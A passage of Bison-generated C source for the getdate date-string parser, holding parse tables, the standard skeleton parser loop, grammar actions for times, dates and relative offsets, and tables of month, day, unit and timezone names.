     0,    13,     9,    12,     0,     9,    13,     0,     9,    13,
    17,    13,     0,    13,     9,     0,    13,     9,    13,     0,
    26,     3,     0,    26,     0,    13,     8,     0,    12,     8,
     0,     8,     0,    12,    11,     0,    13,    11,     0,    11,
     0,    12,    10,     0,    13,    10,     0,    10,     0,    13,
     0,     0,     7,     0
};

#endif

#if YYDEBUG != 0
static const short yyrline[] = { 0,
   170,   171,   174,   177,   180,   183,   186,   189,   192,   198,
   204,   211,   217,   227,   231,   235,   242,   246,   250,   256,
   260,   265,   271,   277,   281,   286,   290,   297,   301,   304,
   307,   310,   313,   316,   319,   322,   325,   328,   333,   360,
   363
};
#endif


#if YYDEBUG != 0 || defined (YYERROR_VERBOSE)

static const char * const yytname[] = {   "$","error","$undefined.","tAGO","tDAY",
"tDAYZONE","tID","tMERIDIAN","tMINUTE_UNIT","tMONTH","tMONTH_UNIT","tSEC_UNIT",
"tSNUMBER","tUNUMBER","tZONE","tDST","':'","','","'/'","spec","item","time",
"zone","day","date","rel","relunit","number","o_merid", NULL
};
#endif

static const short yyr1[] = {     0,
    19,    19,    20,    20,    20,    20,    20,    20,    21,    21,
    21,    21,    21,    22,    22,    22,    23,    23,    23,    24,
    24,    24,    24,    24,    24,    24,    24,    25,    25,    26,
    26,    26,    26,    26,    26,    26,    26,    26,    27,    28,
    28
};

static const short yyr2[] = {     0,
     0,     2,     1,     1,     1,     1,     1,     1,     2,     4,
     4,     6,     6,     1,     1,     2,     1,     2,     2,     3,
     5,     3,     3,     2,     4,     2,     3,     2,     1,     2,
     2,     1,     2,     2,     1,     2,     2,     1,     1,     0,
     1
};

static const short yydefact[] = {     1,
     0,    17,    15,    32,     0,    38,    35,     0,    39,    14,
     2,     3,     4,     6,     5,     7,    29,     8,    18,    24,
    31,    36,    33,    19,     9,    30,    26,    37,    34,     0,
     0,     0,    16,    28,     0,    23,    27,    22,    40,    20,
    25,    41,    11,     0,    10,     0,    40,    21,    13,    12,
     0,     0
};

static const short yydefgoto[] = {     1,
    11,    12,    13,    14,    15,    16,    17,    18,    45
};

static const short yypact[] = {-32768,
     0,    -1,-32768,-32768,     4,-32768,-32768,    25,    11,    -8,
-32768,-32768,-32768,-32768,-32768,-32768,    21,-32768,-32768,     9,
-32768,-32768,-32768,-32768,-32768,-32768,   -10,-32768,-32768,    16,
    19,    24,-32768,-32768,    26,-32768,-32768,-32768,    18,    13,
-32768,-32768,-32768,    27,-32768,    28,    -6,-32768,-32768,-32768,
    38,-32768
};

static const short yypgoto[] = {-32768,
-32768,-32768,-32768,-32768,-32768,-32768,-32768,-32768,    -5
};


#define	YYLAST		42


static const short yytable[] = {    51,
    42,    36,    37,     2,     3,    49,    33,     4,     5,     6,
     7,     8,     9,    10,    24,    19,    20,    25,    26,    27,
    28,    29,    30,    34,    42,    35,    31,    38,    32,    43,
    46,    39,    21,    44,    22,    23,    40,    52,    41,    47,
    48,    50
};

static const short yycheck[] = {     0,
     7,    12,    13,     4,     5,    12,    15,     8,     9,    10,
    11,    12,    13,    14,     4,    17,    13,     7,     8,     9,
    10,    11,    12,     3,     7,    17,    16,    12,    18,    12,
    18,    13,     8,    16,    10,    11,    13,     0,    13,    13,
    13,    47
};
/* -*-C-*-  Note some compilers choke on comments on `#line' lines.  */
#line 3 "/p/share/bison.simple"

/* Skeleton output parser for bison,
   Copyright (C) 1984, 1989, 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* As a special exception, when this file is copied by Bison into a
   Bison output file, you may use that output file without restriction.
   This special exception was added by the Free Software Foundation
   in version 1.24 of Bison.  */

#ifndef alloca
#ifdef __GNUC__
#define alloca __builtin_alloca
#else /* not GNU C.  */
#if (!defined (__STDC__) && defined (sparc)) || defined (__sparc__) || defined (__sparc) || defined (__sgi)
#include <alloca.h>
#else /* not sparc */
#if defined (MSDOS) && !defined (__TURBOC__)
#include <malloc.h>
#else /* not MSDOS, or __TURBOC__ */
#if defined(_AIX)
#include <malloc.h>
 #pragma alloca
#else /* not MSDOS, __TURBOC__, or _AIX */
#ifdef __hpux
#ifdef __cplusplus
extern "C" {
void *alloca (unsigned int);
};
#else /* not __cplusplus */
void *alloca ();
#endif /* not __cplusplus */
#endif /* __hpux */
#endif /* not _AIX */
#endif /* not MSDOS, or __TURBOC__ */
#endif /* not sparc.  */
#endif /* not GNU C.  */
#endif /* alloca not defined.  */

/* This is the parser code that is written into each bison parser
  when the %semantic_parser declaration is not specified in the grammar.
  It was written by Richard Stallman by simplifying the hairy parser
  used when %semantic_parser is specified.  */

/* Note: there must be only one dollar sign in this file.
   It is replaced by the list of actions, each action
   as one case of the switch.  */

#define yyerrok		(yyerrstatus = 0)
#define yyclearin	(yychar = YYEMPTY)
#define YYEMPTY		-2
#define YYEOF		0
#define YYACCEPT	return(0)
#define YYABORT 	return(1)
#define YYERROR		goto yyerrlab1
/* Like YYERROR except do call yyerror.
   This remains here temporarily to ease the
   transition to the new meaning of YYERROR, for GCC.
   Once GCC version 2 has supplanted version 1, this can go.  */
#define YYFAIL		goto yyerrlab
#define YYRECOVERING()  (!!yyerrstatus)
#define YYBACKUP(token, value) \
do								\
  if (yychar == YYEMPTY && yylen == 1)				\
    { yychar = (token), yylval = (value);			\
      yychar1 = YYTRANSLATE (yychar);				\
      YYPOPSTACK;						\
      goto yybackup;						\
    }								\
  else								\
    { yyerror ("syntax error: cannot back up"); YYERROR; }	\
while (0)

#define YYTERROR	1
#define YYERRCODE	256

#ifndef YYPURE
#define YYLEX		yylex()
#endif

#ifdef YYPURE
#ifdef YYLSP_NEEDED
#ifdef YYLEX_PARAM
#define YYLEX		yylex(&yylval, &yylloc, YYLEX_PARAM)
#else
#define YYLEX		yylex(&yylval, &yylloc)
#endif
#else /* not YYLSP_NEEDED */
#ifdef YYLEX_PARAM
#define YYLEX		yylex(&yylval, YYLEX_PARAM)
#else
#define YYLEX		yylex(&yylval)
#endif
#endif /* not YYLSP_NEEDED */
#endif

/* If nonreentrant, generate the variables here */

#ifndef YYPURE

int	yychar;			/*  the lookahead symbol		*/
YYSTYPE	yylval;			/*  the semantic value of the		*/
				/*  lookahead symbol			*/

#ifdef YYLSP_NEEDED
YYLTYPE yylloc;			/*  location data for the lookahead	*/
				/*  symbol				*/
#endif

int yynerrs;			/*  number of parse errors so far       */
#endif  /* not YYPURE */

#if YYDEBUG != 0
int yydebug;			/*  nonzero means print parse trace	*/
/* Since this is uninitialized, it does not stop multiple parsers
   from coexisting.  */
#endif

/*  YYINITDEPTH indicates the initial size of the parser's stacks	*/

#ifndef	YYINITDEPTH
#define YYINITDEPTH 200
#endif

/*  YYMAXDEPTH is the maximum size the stacks can grow to
    (effective only if the built-in stack extension method is used).  */

#if YYMAXDEPTH == 0
#undef YYMAXDEPTH
#endif

#ifndef YYMAXDEPTH
#define YYMAXDEPTH 10000
#endif

/* Prevent warning if -Wstrict-prototypes.  */
#ifdef __GNUC__
int yyparse (void);
#endif

#if __GNUC__ > 1		/* GNU C and GNU C++ define this.  */
#define __yy_memcpy(TO,FROM,COUNT)	__builtin_memcpy(TO,FROM,COUNT)
#else				/* not GNU C or C++ */
#ifndef __cplusplus

/* This is the most reliable way to avoid incompatibilities
   in available built-in functions on various systems.  */
static void
__yy_memcpy (to, from, count)
     char *to;
     char *from;
     int count;
{
  register char *f = from;
  register char *t = to;
  register int i = count;

  while (i-- > 0)
    *t++ = *f++;
}

#else /* __cplusplus */

/* This is the most reliable way to avoid incompatibilities
   in available built-in functions on various systems.  */
static void
__yy_memcpy (char *to, char *from, int count)
{
  register char *t = to;
  register char *f = from;
  register int i = count;

  while (i-- > 0)
    *t++ = *f++;
}

#endif
#endif

#line 196 "/p/share/bison.simple"

/* The user can define YYPARSE_PARAM as the name of an argument to be passed
   into yyparse.  The argument should have type void *.
   It should actually point to an object.
   Grammar actions can access the variable by casting it
   to the proper pointer type.  */

#ifdef YYPARSE_PARAM
#ifdef __cplusplus
#define YYPARSE_PARAM_ARG void *YYPARSE_PARAM
#define YYPARSE_PARAM_DECL
#else /* not __cplusplus */
#define YYPARSE_PARAM_ARG YYPARSE_PARAM
#define YYPARSE_PARAM_DECL void *YYPARSE_PARAM;
#endif /* not __cplusplus */
#else /* not YYPARSE_PARAM */
#define YYPARSE_PARAM_ARG
#define YYPARSE_PARAM_DECL
#endif /* not YYPARSE_PARAM */

int
yyparse(YYPARSE_PARAM_ARG)
     YYPARSE_PARAM_DECL
{
  register int yystate;
  register int yyn;
  register short *yyssp;
  register YYSTYPE *yyvsp;
  int yyerrstatus;	/*  number of tokens to shift before error messages enabled */
  int yychar1 = 0;		/*  lookahead token as an internal (translated) token number */

  short	yyssa[YYINITDEPTH];	/*  the state stack			*/
  YYSTYPE yyvsa[YYINITDEPTH];	/*  the semantic value stack		*/

  short *yyss = yyssa;		/*  refer to the stacks thru separate pointers */
  YYSTYPE *yyvs = yyvsa;	/*  to allow yyoverflow to reallocate them elsewhere */

#ifdef YYLSP_NEEDED
  YYLTYPE yylsa[YYINITDEPTH];	/*  the location stack			*/
  YYLTYPE *yyls = yylsa;
  YYLTYPE *yylsp;

#define YYPOPSTACK   (yyvsp--, yyssp--, yylsp--)
#else
#define YYPOPSTACK   (yyvsp--, yyssp--)
#endif

  int yystacksize = YYINITDEPTH;

#ifdef YYPURE
  int yychar;
  YYSTYPE yylval;
  int yynerrs;
#ifdef YYLSP_NEEDED
  YYLTYPE yylloc;
#endif
#endif

  YYSTYPE yyval;		/*  the variable used to return		*/
				/*  semantic values from the action	*/
				/*  routines				*/

  int yylen;

#if YYDEBUG != 0
  if (yydebug)
    fprintf(stderr, "Starting parse\n");
#endif

  yystate = 0;
  yyerrstatus = 0;
  yynerrs = 0;
  yychar = YYEMPTY;		/* Cause a token to be read.  */

  /* Initialize stack pointers.
     Waste one element of value and location stack
     so that they stay on the same level as the state stack.
     The wasted elements are never initialized.  */

  yyssp = yyss - 1;
  yyvsp = yyvs;
#ifdef YYLSP_NEEDED
  yylsp = yyls;
#endif

/* Push a new state, which is found in  yystate  .  */
/* In all cases, when you get here, the value and location stacks
   have just been pushed. so pushing a state here evens the stacks.  */
yynewstate:

  *++yyssp = yystate;

  if (yyssp >= yyss + yystacksize - 1)
    {
      /* Give user a chance to reallocate the stack */
      /* Use copies of these so that the &'s don't force the real ones into memory. */
      YYSTYPE *yyvs1 = yyvs;
      short *yyss1 = yyss;
#ifdef YYLSP_NEEDED
      YYLTYPE *yyls1 = yyls;
#endif

      /* Get the current used size of the three stacks, in elements.  */
      int size = yyssp - yyss + 1;

#ifdef yyoverflow
      /* Each stack pointer address is followed by the size of
	 the data in use in that stack, in bytes.  */
#ifdef YYLSP_NEEDED
      /* This used to be a conditional around just the two extra args,
	 but that might be undefined if yyoverflow is a macro.  */
      yyoverflow("parser stack overflow",
		 &yyss1, size * sizeof (*yyssp),
		 &yyvs1, size * sizeof (*yyvsp),
		 &yyls1, size * sizeof (*yylsp),
		 &yystacksize);
#else
      yyoverflow("parser stack overflow",
		 &yyss1, size * sizeof (*yyssp),
		 &yyvs1, size * sizeof (*yyvsp),
		 &yystacksize);
#endif

      yyss = yyss1; yyvs = yyvs1;
#ifdef YYLSP_NEEDED
      yyls = yyls1;
#endif
#else /* no yyoverflow */
      /* Extend the stack our own way.  */
      if (yystacksize >= YYMAXDEPTH)
	{
	  yyerror("parser stack overflow");
	  return 2;
	}
      yystacksize *= 2;
      if (yystacksize > YYMAXDEPTH)
	yystacksize = YYMAXDEPTH;
      yyss = (short *) alloca (yystacksize * sizeof (*yyssp));
      __yy_memcpy ((char *)yyss, (char *)yyss1, size * sizeof (*yyssp));
      yyvs = (YYSTYPE *) alloca (yystacksize * sizeof (*yyvsp));
      __yy_memcpy ((char *)yyvs, (char *)yyvs1, size * sizeof (*yyvsp));
#ifdef YYLSP_NEEDED
      yyls = (YYLTYPE *) alloca (yystacksize * sizeof (*yylsp));
      __yy_memcpy ((char *)yyls, (char *)yyls1, size * sizeof (*yylsp));
#endif
#endif /* no yyoverflow */

      yyssp = yyss + size - 1;
      yyvsp = yyvs + size - 1;
#ifdef YYLSP_NEEDED
      yylsp = yyls + size - 1;
#endif

#if YYDEBUG != 0
      if (yydebug)
	fprintf(stderr, "Stack size increased to %d\n", yystacksize);
#endif

      if (yyssp >= yyss + yystacksize - 1)
	YYABORT;
    }

#if YYDEBUG != 0
  if (yydebug)
    fprintf(stderr, "Entering state %d\n", yystate);
#endif

  goto yybackup;
 yybackup:

/* Do appropriate processing given the current state.  */
/* Read a lookahead token if we need one and don't already have one.  */
/* yyresume: */

  /* First try to decide what to do without reference to lookahead token.  */

  yyn = yypact[yystate];
  if (yyn == YYFLAG)
    goto yydefault;

  /* Not known => get a lookahead token if don't already have one.  */

  /* yychar is either YYEMPTY or YYEOF
     or a valid token in external form.  */

  if (yychar == YYEMPTY)
    {
#if YYDEBUG != 0
      if (yydebug)
	fprintf(stderr, "Reading a token: ");
#endif
      yychar = YYLEX;
    }

  /* Convert token to internal form (in yychar1) for indexing tables with */

  if (yychar <= 0)		/* This means end of input. */
    {
      yychar1 = 0;
      yychar = YYEOF;		/* Don't call YYLEX any more */

#if YYDEBUG != 0
      if (yydebug)
	fprintf(stderr, "Now at end of input.\n");
#endif
    }
  else
    {
      yychar1 = YYTRANSLATE(yychar);

#if YYDEBUG != 0
      if (yydebug)
	{
	  fprintf (stderr, "Next token is %d (%s", yychar, yytname[yychar1]);
	  /* Give the individual parser a way to print the precise meaning
	     of a token, for further debugging info.  */
#ifdef YYPRINT
	  YYPRINT (stderr, yychar, yylval);
#endif
	  fprintf (stderr, ")\n");
	}
#endif
    }

  yyn += yychar1;
  if (yyn < 0 || yyn > YYLAST || yycheck[yyn] != yychar1)
    goto yydefault;

  yyn = yytable[yyn];

  /* yyn is what to do for this token type in this state.
     Negative => reduce, -yyn is rule number.
     Positive => shift, yyn is new state.
       New state is final state => don't bother to shift,
       just return success.
     0, or most negative number => error.  */

  if (yyn < 0)
    {
      if (yyn == YYFLAG)
	goto yyerrlab;
      yyn = -yyn;
      goto yyreduce;
    }
  else if (yyn == 0)
    goto yyerrlab;

  if (yyn == YYFINAL)
    YYACCEPT;

  /* Shift the lookahead token.  */

#if YYDEBUG != 0
  if (yydebug)
    fprintf(stderr, "Shifting token %d (%s), ", yychar, yytname[yychar1]);
#endif

  /* Discard the token being shifted unless it is eof.  */
  if (yychar != YYEOF)
    yychar = YYEMPTY;

  *++yyvsp = yylval;
#ifdef YYLSP_NEEDED
  *++yylsp = yylloc;
#endif

  /* count tokens shifted since error; after three, turn off error status.  */
  if (yyerrstatus) yyerrstatus--;

  yystate = yyn;
  goto yynewstate;

/* Do the default action for the current state.  */
yydefault:

  yyn = yydefact[yystate];
  if (yyn == 0)
    goto yyerrlab;

/* Do a reduction.  yyn is the number of a rule to reduce with.  */
yyreduce:
  yylen = yyr2[yyn];
  if (yylen > 0)
    yyval = yyvsp[1-yylen]; /* implement default value of the action */

#if YYDEBUG != 0
  if (yydebug)
    {
      int i;

      fprintf (stderr, "Reducing via rule %d (line %d), ",
	       yyn, yyrline[yyn]);

      /* Print the symbols being reduced, and their result.  */
      for (i = yyprhs[yyn]; yyrhs[i] > 0; i++)
	fprintf (stderr, "%s ", yytname[yyrhs[i]]);
      fprintf (stderr, " -> %s\n", yytname[yyr1[yyn]]);
    }
#endif


  switch (yyn) {

case 3:
#line 174 "./getdate.y"
{
	    yyHaveTime++;
	;
    break;}
case 4:
#line 177 "./getdate.y"
{
	    yyHaveZone++;
	;
    break;}
case 5:
#line 180 "./getdate.y"
{
	    yyHaveDate++;
	;
    break;}
case 6:
#line 183 "./getdate.y"
{
	    yyHaveDay++;
	;
    break;}
case 7:
#line 186 "./getdate.y"
{
	    yyHaveRel++;
	;
    break;}
case 9:
#line 192 "./getdate.y"
{
	    yyHour = yyvsp[-1].Number;
	    yyMinutes = 0;
	    yySeconds = 0;
	    yyMeridian = yyvsp[0].Meridian;
	;
    break;}
case 10:
#line 198 "./getdate.y"
{
	    yyHour = yyvsp[-3].Number;
	    yyMinutes = yyvsp[-1].Number;
	    yySeconds = 0;
	    yyMeridian = yyvsp[0].Meridian;
	;
    break;}
case 11:
#line 204 "./getdate.y"
{
	    yyHour = yyvsp[-3].Number;
	    yyMinutes = yyvsp[-1].Number;
	    yyMeridian = MER24;
	    yyDSTmode = DSToff;
	    yyTimezone = - (yyvsp[0].Number % 100 + (yyvsp[0].Number / 100) * 60);
	;
    break;}
case 12:
#line 211 "./getdate.y"
{
	    yyHour = yyvsp[-5].Number;
	    yyMinutes = yyvsp[-3].Number;
	    yySeconds = yyvsp[-1].Number;
	    yyMeridian = yyvsp[0].Meridian;
	;
    break;}
case 13:
#line 217 "./getdate.y"
{
	    yyHour = yyvsp[-5].Number;
	    yyMinutes = yyvsp[-3].Number;
	    yySeconds = yyvsp[-1].Number;
	    yyMeridian = MER24;
	    yyDSTmode = DSToff;
	    yyTimezone = - (yyvsp[0].Number % 100 + (yyvsp[0].Number / 100) * 60);
	;
    break;}
case 14:
#line 227 "./getdate.y"
{
	    yyTimezone = yyvsp[0].Number;
	    yyDSTmode = DSToff;
	;
    break;}
case 15:
#line 231 "./getdate.y"
{
	    yyTimezone = yyvsp[0].Number;
	    yyDSTmode = DSTon;
	;
    break;}
case 16:
#line 236 "./getdate.y"
{
	    yyTimezone = yyvsp[-1].Number;
	    yyDSTmode = DSTon;
	;
    break;}
case 17:
#line 242 "./getdate.y"
{
	    yyDayOrdinal = 1;
	    yyDayNumber = yyvsp[0].Number;
	;
    break;}
case 18:
#line 246 "./getdate.y"
{
	    yyDayOrdinal = 1;
	    yyDayNumber = yyvsp[-1].Number;
	;
    break;}
case 19:
#line 250 "./getdate.y"
{
	    yyDayOrdinal = yyvsp[-1].Number;
	    yyDayNumber = yyvsp[0].Number;
	;
    break;}
case 20:
#line 256 "./getdate.y"
{
	    yyMonth = yyvsp[-2].Number;
	    yyDay = yyvsp[0].Number;
	;
    break;}
case 21:
#line 260 "./getdate.y"
{
	    yyMonth = yyvsp[-4].Number;
	    yyDay = yyvsp[-2].Number;
	    yyYear = yyvsp[0].Number;
	;
    break;}
case 22:
#line 265 "./getdate.y"
{
	    /* ISO 8601 format.  yyyy-mm-dd.  */
	    yyYear = yyvsp[-2].Number;
	    yyMonth = -yyvsp[-1].Number;
	    yyDay = -yyvsp[0].Number;
	;
    break;}
case 23:
#line 271 "./getdate.y"
{
	    /* e.g. 17-JUN-1992.  */
	    yyDay = yyvsp[-2].Number;
	    yyMonth = yyvsp[-1].Number;
	    yyYear = -yyvsp[0].Number;
	;
    break;}
case 24:
#line 277 "./getdate.y"
{
	    yyMonth = yyvsp[-1].Number;
	    yyDay = yyvsp[0].Number;
	;
    break;}
case 25:
#line 281 "./getdate.y"
{
	    yyMonth = yyvsp[-3].Number;
	    yyDay = yyvsp[-2].Number;
	    yyYear = yyvsp[0].Number;
	;
    break;}
case 26:
#line 286 "./getdate.y"
{
	    yyMonth = yyvsp[0].Number;
	    yyDay = yyvsp[-1].Number;
	;
    break;}
case 27:
#line 290 "./getdate.y"
{
	    yyMonth = yyvsp[-1].Number;
	    yyDay = yyvsp[-2].Number;
	    yyYear = yyvsp[0].Number;
	;
    break;}
case 28:
#line 297 "./getdate.y"
{
	    yyRelSeconds = -yyRelSeconds;
	    yyRelMonth = -yyRelMonth;
	;
    break;}
case 30:
#line 304 "./getdate.y"
{
	    yyRelSeconds += yyvsp[-1].Number * yyvsp[0].Number * 60L;
	;
    break;}
case 31:
#line 307 "./getdate.y"
{
	    yyRelSeconds += yyvsp[-1].Number * yyvsp[0].Number * 60L;
	;
    break;}
case 32:
#line 310 "./getdate.y"
{
	    yyRelSeconds += yyvsp[0].Number * 60L;
	;
    break;}
case 33:
#line 313 "./getdate.y"
{
	    yyRelSeconds += yyvsp[-1].Number;
	;
    break;}
case 34:
#line 316 "./getdate.y"
{
	    yyRelSeconds += yyvsp[-1].Number;
	;
    break;}
case 35:
#line 319 "./getdate.y"
{
	    yyRelSeconds++;
	;
    break;}
case 36:
#line 322 "./getdate.y"
{
	    yyRelMonth += yyvsp[-1].Number * yyvsp[0].Number;
	;
    break;}
case 37:
#line 325 "./getdate.y"
{
	    yyRelMonth += yyvsp[-1].Number * yyvsp[0].Number;
	;
    break;}
case 38:
#line 328 "./getdate.y"
{
	    yyRelMonth += yyvsp[0].Number;
	;
    break;}
case 39:
#line 333 "./getdate.y"
{
	    if (yyHaveTime && yyHaveDate && !yyHaveRel)
		yyYear = yyvsp[0].Number;
	    else {
		if (yyvsp[0].Number>10000) {
		    yyHaveDate++;
		    yyDay= (yyvsp[0].Number)%100;
		    yyMonth= (yyvsp[0].Number/100)%100;
		    yyYear = yyvsp[0].Number/10000;
		}
		else {
		    yyHaveTime++;
		    if (yyvsp[0].Number < 100) {
			yyHour = yyvsp[0].Number;
			yyMinutes = 0;
		    }
		    else {
		    	yyHour = yyvsp[0].Number / 100;
		    	yyMinutes = yyvsp[0].Number % 100;
		    }
		    yySeconds = 0;
		    yyMeridian = MER24;
	        }
	    }
	;
    break;}
case 40:
#line 360 "./getdate.y"
{
	    yyval.Meridian = MER24;
	;
    break;}
case 41:
#line 363 "./getdate.y"
{
	    yyval.Meridian = yyvsp[0].Meridian;
	;
    break;}
}
   /* the action file gets copied in in place of this dollarsign */
#line 498 "/p/share/bison.simple"

  yyvsp -= yylen;
  yyssp -= yylen;
#ifdef YYLSP_NEEDED
  yylsp -= yylen;
#endif

#if YYDEBUG != 0
  if (yydebug)
    {
      short *ssp1 = yyss - 1;
      fprintf (stderr, "state stack now");
      while (ssp1 != yyssp)
	fprintf (stderr, " %d", *++ssp1);
      fprintf (stderr, "\n");
    }
#endif

  *++yyvsp = yyval;

#ifdef YYLSP_NEEDED
  yylsp++;
  if (yylen == 0)
    {
      yylsp->first_line = yylloc.first_line;
      yylsp->first_column = yylloc.first_column;
      yylsp->last_line = (yylsp-1)->last_line;
      yylsp->last_column = (yylsp-1)->last_column;
      yylsp->text = 0;
    }
  else
    {
      yylsp->last_line = (yylsp+yylen-1)->last_line;
      yylsp->last_column = (yylsp+yylen-1)->last_column;
    }
#endif

  /* Now "shift" the result of the reduction.
     Determine what state that goes to,
     based on the state we popped back to
     and the rule number reduced by.  */

  yyn = yyr1[yyn];

  yystate = yypgoto[yyn - YYNTBASE] + *yyssp;
  if (yystate >= 0 && yystate <= YYLAST && yycheck[yystate] == *yyssp)
    yystate = yytable[yystate];
  else
    yystate = yydefgoto[yyn - YYNTBASE];

  goto yynewstate;

yyerrlab:   /* here on detecting error */

  if (! yyerrstatus)
    /* If not already recovering from an error, report this error.  */
    {
      ++yynerrs;

#ifdef YYERROR_VERBOSE
      yyn = yypact[yystate];

      if (yyn > YYFLAG && yyn < YYLAST)
	{
	  int size = 0;
	  char *msg;
	  int x, count;

	  count = 0;
	  /* Start X at -yyn if nec to avoid negative indexes in yycheck.  */
	  for (x = (yyn < 0 ? -yyn : 0);
	       x < (sizeof(yytname) / sizeof(char *)); x++)
	    if (yycheck[x + yyn] == x)
	      size += strlen(yytname[x]) + 15, count++;
	  msg = (char *) malloc(size + 15);
	  if (msg != 0)
	    {
	      strcpy(msg, "parse error");

	      if (count < 5)
		{
		  count = 0;
		  for (x = (yyn < 0 ? -yyn : 0);
		       x < (sizeof(yytname) / sizeof(char *)); x++)
		    if (yycheck[x + yyn] == x)
		      {
			strcat(msg, count == 0 ? ", expecting `" : " or `");
			strcat(msg, yytname[x]);
			strcat(msg, "'");
			count++;
		      }
		}
	      yyerror(msg);
	      free(msg);
	    }
	  else
	    yyerror ("parse error; also virtual memory exceeded");
	}
      else
#endif /* YYERROR_VERBOSE */
	yyerror("parse error");
    }

  goto yyerrlab1;
yyerrlab1:   /* here on error raised explicitly by an action */

  if (yyerrstatus == 3)
    {
      /* if just tried and failed to reuse lookahead token after an error, discard it.  */

      /* return failure if at end of input */
      if (yychar == YYEOF)
	YYABORT;

#if YYDEBUG != 0
      if (yydebug)
	fprintf(stderr, "Discarding token %d (%s).\n", yychar, yytname[yychar1]);
#endif

      yychar = YYEMPTY;
    }

  /* Else will try to reuse lookahead token
     after shifting the error token.  */

  yyerrstatus = 3;		/* Each real token shifted decrements this */

  goto yyerrhandle;

yyerrdefault:  /* current state does not do anything special for the error token. */

#if 0
  /* This is wrong; only states that explicitly want error tokens
     should shift them.  */
  yyn = yydefact[yystate];  /* If its default is to accept any token, ok.  Otherwise pop it.*/
  if (yyn) goto yydefault;
#endif

yyerrpop:   /* pop the current state because it cannot handle the error token */

  if (yyssp == yyss) YYABORT;
  yyvsp--;
  yystate = *--yyssp;
#ifdef YYLSP_NEEDED
  yylsp--;
#endif

#if YYDEBUG != 0
  if (yydebug)
    {
      short *ssp1 = yyss - 1;
      fprintf (stderr, "Error: state stack now");
      while (ssp1 != yyssp)
	fprintf (stderr, " %d", *++ssp1);
      fprintf (stderr, "\n");
    }
#endif

yyerrhandle:

  yyn = yypact[yystate];
  if (yyn == YYFLAG)
    goto yyerrdefault;

  yyn += YYTERROR;
  if (yyn < 0 || yyn > YYLAST || yycheck[yyn] != YYTERROR)
    goto yyerrdefault;

  yyn = yytable[yyn];
  if (yyn < 0)
    {
      if (yyn == YYFLAG)
	goto yyerrpop;
      yyn = -yyn;
      goto yyreduce;
    }
  else if (yyn == 0)
    goto yyerrpop;

  if (yyn == YYFINAL)
    YYACCEPT;

#if YYDEBUG != 0
  if (yydebug)
    fprintf(stderr, "Shifting error token, ");
#endif

  *++yyvsp = yylval;
#ifdef YYLSP_NEEDED
  *++yylsp = yylloc;
#endif

  yystate = yyn;
  goto yynewstate;
}
#line 368 "./getdate.y"


/* Month and day table. */
static TABLE const MonthDayTable[] = {
    { "january",	tMONTH,  1 },
    { "february",	tMONTH,  2 },
    { "march",		tMONTH,  3 },
    { "april",		tMONTH,  4 },
    { "may",		tMONTH,  5 },
    { "june",		tMONTH,  6 },
    { "july",		tMONTH,  7 },
    { "august",		tMONTH,  8 },
    { "september",	tMONTH,  9 },
    { "sept",		tMONTH,  9 },
    { "october",	tMONTH, 10 },
    { "november",	tMONTH, 11 },
    { "december",	tMONTH, 12 },
    { "sunday",		tDAY, 0 },
    { "monday",		tDAY, 1 },
    { "tuesday",	tDAY, 2 },
    { "tues",		tDAY, 2 },
    { "wednesday",	tDAY, 3 },
    { "wednes",		tDAY, 3 },
    { "thursday",	tDAY, 4 },
    { "thur",		tDAY, 4 },
    { "thurs",		tDAY, 4 },
    { "friday",		tDAY, 5 },
    { "saturday",	tDAY, 6 },
    { NULL }
};

/* Time units table. */
static TABLE const UnitsTable[] = {
    { "year",		tMONTH_UNIT,	12 },
    { "month",		tMONTH_UNIT,	1 },
    { "fortnight",	tMINUTE_UNIT,	14 * 24 * 60 },
    { "week",		tMINUTE_UNIT,	7 * 24 * 60 },
    { "day",		tMINUTE_UNIT,	1 * 24 * 60 },
    { "hour",		tMINUTE_UNIT,	60 },
    { "minute",		tMINUTE_UNIT,	1 },
    { "min",		tMINUTE_UNIT,	1 },
    { "second",		tSEC_UNIT,	1 },
    { "sec",		tSEC_UNIT,	1 },
    { NULL }
};

/* Assorted relative-time words. */
static TABLE const OtherTable[] = {
    { "tomorrow",	tMINUTE_UNIT,	1 * 24 * 60 },
    { "yesterday",	tMINUTE_UNIT,	-1 * 24 * 60 },
    { "today",		tMINUTE_UNIT,	0 },
    { "now",		tMINUTE_UNIT,	0 },
    { "last",		tUNUMBER,	-1 },
    { "this",		tMINUTE_UNIT,	0 },
    { "next",		tUNUMBER,	2 },
    { "first",		tUNUMBER,	1 },
/*  { "second",		tUNUMBER,	2 }, */
    { "third",		tUNUMBER,	3 },
    { "fourth",		tUNUMBER,	4 },
    { "fifth",		tUNUMBER,	5 },
    { "sixth",		tUNUMBER,	6 },
    { "seventh",	tUNUMBER,	7 },
    { "eighth",		tUNUMBER,	8 },
    { "ninth",		tUNUMBER,	9 },
    { "tenth",		tUNUMBER,	10 },
    { "eleventh",	tUNUMBER,	11 },
    { "twelfth",	tUNUMBER,	12 },
    { "ago",		tAGO,	1 },
    { NULL }
};

/* The timezone table. */
/* Some of these are commented out because a time_t can't store a float. */
static TABLE const TimezoneTable[] = {
    { "gmt",	tZONE,     HOUR ( 0) },	/* Greenwich Mean */
    { "ut",	tZONE,     HOUR ( 0) },	/* Universal (Coordinated) */
    { "utc",	tZONE,     HOUR ( 0) },
    { "wet",	tZONE,     HOUR ( 0) },	/* Western European */
    { "bst",	tDAYZONE,  HOUR ( 0) },	/* British Summer */
    { "wat",	tZONE,     HOUR ( 1) },	/* West Africa */
    { "at",	tZONE,     HOUR ( 2) },	/* Azores */
#if	0
    /* For completeness.  BST is also British Summer, and GST is
     * also Guam Standard. */
    { "bst",	tZONE,     HOUR ( 3) },	/* Brazil Standard */
    { "gst",	tZONE,     HOUR ( 3) },	/* Greenland Standard */
#endif
#if 0
    { "nft",	tZONE,     HOUR (3.5) },	/* Newfoundland */
    { "nst",	tZONE,     HOUR (3.5) },	/* Newfoundland Standard */
    { "ndt",	tDAYZONE,  HOUR (3.5) },	/* Newfoundland Daylight */
#endif
    { "ast",	tZONE,     HOUR ( 4) },	/* Atlantic Standard */
    { "adt",	tDAYZONE,  HOUR ( 4) },	/* Atlantic Daylight */
